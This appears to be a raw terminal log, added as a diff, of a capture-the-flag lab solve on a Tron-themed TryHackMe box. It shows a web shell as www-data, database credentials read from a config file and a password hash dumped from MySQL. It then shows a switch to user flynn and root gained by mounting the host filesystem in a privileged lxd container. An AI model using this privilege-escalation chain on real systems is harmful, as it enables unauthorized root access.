@@ -1,0 +1,299 @@
+Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:29:14 up  1:20,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ www-data@light-cycle:/$ clear
+TERM environment variable not set.
+www-data@light-cycle:/$ whoami
+www-data
+www-data@light-cycle:/$ ^C
+www-data@light-cycle:/$ ^C
+www-data@light-cycle:/$ ^C
+www-data@light-cycle:/$ ^C
+www-data@light-cycle:/$ clear
+TERM environment variable not set.
+www-data@light-cycle:/$ export TERM=xterm
+www-data@light-cycle:/$ clear
+[3J[H[2Jwww-data@light-cycle:/$ exit
+exit
+$ Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:32:54 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ www-data
+$ bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ TERM environment variable not set.
+$ python3: can't open file 'import pty; pty.spawn("/bin/bash")': [Errno 2] No such file or directory
+$ www-data@light-cycle:/$ import TERM=xterm
+
+Command 'import' not found, but can be installed with:
+
+apt install imagemagick-6.q16                
+apt install graphicsmagick-imagemagick-compat
+apt install imagemagick-6.q16hdri            
+
+Ask your administrator to install one of them.
+
+www-data@light-cycle:/$ export TERM=xterm
+www-data@light-cycle:/$ df  ls
+bin   home	      lib64	  opt	sbin	  sys  vmlinuz
+boot  initrd.img      lost+found  proc	snap	  tmp  vmlinuz.old
+dev   initrd.img.old  media	  root	srv	  usr
+etc   lib	      mnt	  run	swapfile  var
+www-data@light-cycle:/$ clear
+[3J[H[2Jwww-data@light-cycle:/$ whoami
+www-data
+www-data@light-cycle:/$ cd /var/www/
+www-data@light-cycle:/var/www$ ls
+ENCOM  TheGrid	web.txt
+www-data@light-cycle:/var/www$ cat web.txt 
+THM{ENTER_THE_GRID}
+www-data@light-cycle:/var/www$ cd TheGrid/
+www-data@light-cycle:/var/www/TheGrid$ clear
+[3J[H[2Jwww-data@light-cycle:/var/www/TheGrid$ ls
+includes  public_html  rickroll.mp4
+www-data@light-cycle:/var/www/TheGrid$ c ls includes/
+apiIncludes.php  dbauth.php  login.php	register.php  upload.php
+www-data@light-cycle:/var/www/TheGrid$ cat /initrd.img           includes/dbauth.php 
+<?php
+	$dbaddr = "localhost";
+	$dbuser = "tron";
+	$dbpass = "IFightForTheUsers";
+	$database = "tron";
+
+	$dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
+	if($dbh->connect_error){
+		die($dbh->connect_error);
+	}
+?>
+www-data@light-cycle:/var/www/TheGrid$ clear
+[3J[H[2Jwww-data@light-cycle:/var/www/TheGrid$ mys   my sq   q sw ql -u tron -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6
+Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> clear
+mysql> show database
+    -> ck^H^H^H        clear
+clear
+^C
+mysql> show databases
+    -> ;\[K
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| tron               |
++--------------------+
+2 rows in set (0.01 sec)
+
+mysql> use tron'[K;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++----------------+
+| Tables_in_tron |
++----------------+
+| users          |
++----------------+
+1 row in set (0.00 sec)
+
+mysql> use users;
+ERROR 1044 (42000): Access denied for user 'tron'@'localhost' to database 'users'
+mysql> select * from users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)
+
+mysql> exit
+Bye
+www-data@light-cycle:/var/www/TheGrid$ clear
+[3J[H[2Jwww-data@light-cycle:/var/www/TheGrid$ su flynn
+Password: 
+]0;flynn@light-cycle: /var/www/TheGridflynn@light-cycle:/var/www/TheGrid$ whoami
+flynn
+]0;flynn@light-cycle: /var/www/TheGridflynn@light-cycle:/var/www/TheGrid$ id
+uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+]0;flynn@light-cycle: /var/www/TheGridflynn@light-cycle:/var/www/TheGrid$ cd /home/flynn/
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ ls
+user.txt
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ catus[K[K user.txt 
+THM{IDENTITY_DISC_RECOGNISED}
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ flynn[K[K[K[K[Kid
+uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ n[Kls
+user.txt
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ nc -lp 4444 > apline.tar.gz
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ ls
+[0m[01;31mapline.tar.gz[0m  user.txt
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc image ./al[Kpline.tar.gz [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kmc ap[K[K[K[K[Kmv apline.tar.gz alpine-v3.12.gz[K[Ktar.gz
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc imp[Kage ./alpine-v3.12.tar.gz --alias myimage
+Error: unknown flag: --alias
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc image ./alpine-v3.12.tar.gz --alias myimage[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K --alias myimage
+Error: unknown flag: --alias
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc image list 
+To start your first container, try: lxc launch ubuntu:18.04
+
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
++--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc image list ./alpine-v3.12.tar.gz --alias myimage[K[K[K[K[K[K[KAlpine
+Error: unknown flag: --alias
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ clearlxc image ./alpine-v3.12.tar.gz --alias Alpine[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Clist [K./alpine-v3.12.tar.gz --alias myimage[C[1@ [1@i[2@mp[1@o[2@rt
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc image import ./alpine-v3.12.tar.gz --alias myimage[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cclear[Klxc image ./alpine-v3.12.tar.gz --alias Alpine[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Clist [K
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+| Alpine  | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC)  |
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+| myimage | c709eb76d61c | no     | alpine v3.12 (20201225_16:23) | i686   | 3.06MB | Dec 25, 2020 at 11:05am (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ lsc init myimage ignite -C ser[Kcurity.privileged=true
+
+Command 'lsc' not found, but can be installed with:
+
+apt install livescript
+Please ask your administrator.
+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lsc init myimage ignite -C security.privileged=true[C[C[1P[1@x
+Error: unknown shorthand flag: 'C' in -C
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc init myimage ignite -C security.privileged=true[1P security.privileged=truec security.privileged=true
+Creating ignite
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lsc config device add ignite mydevice disk source= [K/ path=/m nt/root/[K recursive=true
+
+Command 'lsc' not found, but can be installed with:
+
+apt install livescript
+Please ask your administrator.
+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lsc config device add ignite mydevice disk source=/ path=/mnnt/root recursive=true[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csc config device add ignite mydevice disk source=/ path=/mnt[1P[A]0;flynn@light-cycle: ~flynn@light-cycle:~$ xsc config device add ignite mydevice disk source=/ path=/mn[1@t[A]0;flynn@light-cycle: ~flynn@light-cycle:~$ [C
+
+
+Command 'xsc' not found, but there are 21 similar ones.
+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ xsc config device add ignite mydevice disk source=/ path=/mnnt/root recursive=true[A[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cclear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ ls
+[0m[01;31malpine-v3.12.tar.gz[0m  user.txt
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ history
+    1  whoami
+    2  id
+    3  cd /home/flynn/
+    4  clear
+    5  ls
+    6  cat user.txt 
+    7  id
+    8  ls
+    9  nc -lp 4444 > apline.tar.gz
+   10  clear
+   11  ls
+   12  mv apline.tar.gz alpine-v3.12.tar.gz
+   13  clear
+   14  lxc image ./alpine-v3.12.tar.gz --alias myimage
+   15  lxc image list 
+   16  lxc image ./alpine-v3.12.tar.gz --alias Alpine
+   17  clear
+   18  lxc image import ./alpine-v3.12.tar.gz --alias myimage
+   19  lxc image list 
+   20  clear
+   21  lsc init myimage ignite -C security.privileged=true
+   22  lxc init myimage ignite -C security.privileged=true
+   23  lxc init myimage ignite -c security.privileged=true
+   24  lsc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+   25  xsc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+   26  clear
+   27  ls
+   28  history
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lear
+
+Command 'lear' not found, did you mean:
+
+  command 'pear' from deb php-pear
+  command 'rear' from deb rear
+  command 'bear' from deb bear
+  command 'lsar' from deb unar
+  command 'ear' from deb ecere-dev
+  command 'clear' from deb ncurses-bin
+
+Try: apt install <deb name>
+
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ clear
+[3J[H[2J]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc config device add ignite mydevice disk source=/ path=/mnnt/root recursive=true
+Device mydevice added to ignite
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lsc[K[Kxc start ignite 
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ lxc exec ignite /bin/bash[K[K[K[Ksh
+~ # [6nid
+uid=0(root) gid=0(root)
+~ # [6ncd [J[J[Jcat /roo~ # cat /root/[Jroo[J[J[J~ # cat /root/.ash_history [J~ # cat /root/.ash_history .ash_history [J~ # cat /root/.ash_history .ash_history .ash_history [J~ # cat /root/.ash_history .ash_history .ash_history .ash_history [J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[J[Jls
+~ # [6nls //[J
+[1;34mbin[m    [1;34metc[m    [1;34mlib[m    [1;34mmnt[m    [1;34mproc[m   [1;34mrun[m    [1;34msrv[m    [1;34mtmp[m    [1;34mvar[m
+[1;34mdev[m    [1;34mhome[m   [1;34mmedia[m  [1;34mopt[m    [1;34mroot[m   [1;34msbin[m   [1;34msys[m    [1;34musr[m
+~ # [6ncat /mn~ # cat /mnt/[Jro~ # cat /mnt/root/[Jro~ # cat /mnt/root/root/[J
+.bash_history   .config/        .mysql_history  .ssh/
+.bashrc         .mysql-history  .profile        root.txt
+~ # cat /mnt/root/root/[J
+.bash_history   .config/        .mysql_history  .ssh/
+.bashrc         .mysql-history  .profile        root.txt
+~ # cat /mnt/root/root/[Jr~ # cat /mnt/root/root/root.txt [Jo[J[J
+THM{FLYNN_LIVES}
+
+
+
+"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
+~ # [6nclear
+[H[J~ # [6nwhoami
+root
+~ # [6nexit
+]0;flynn@light-cycle: ~flynn@light-cycle:~$ exit
+exit
+www-data@light-cycle:/var/www/TheGrid$ exit
+exit
+$ 
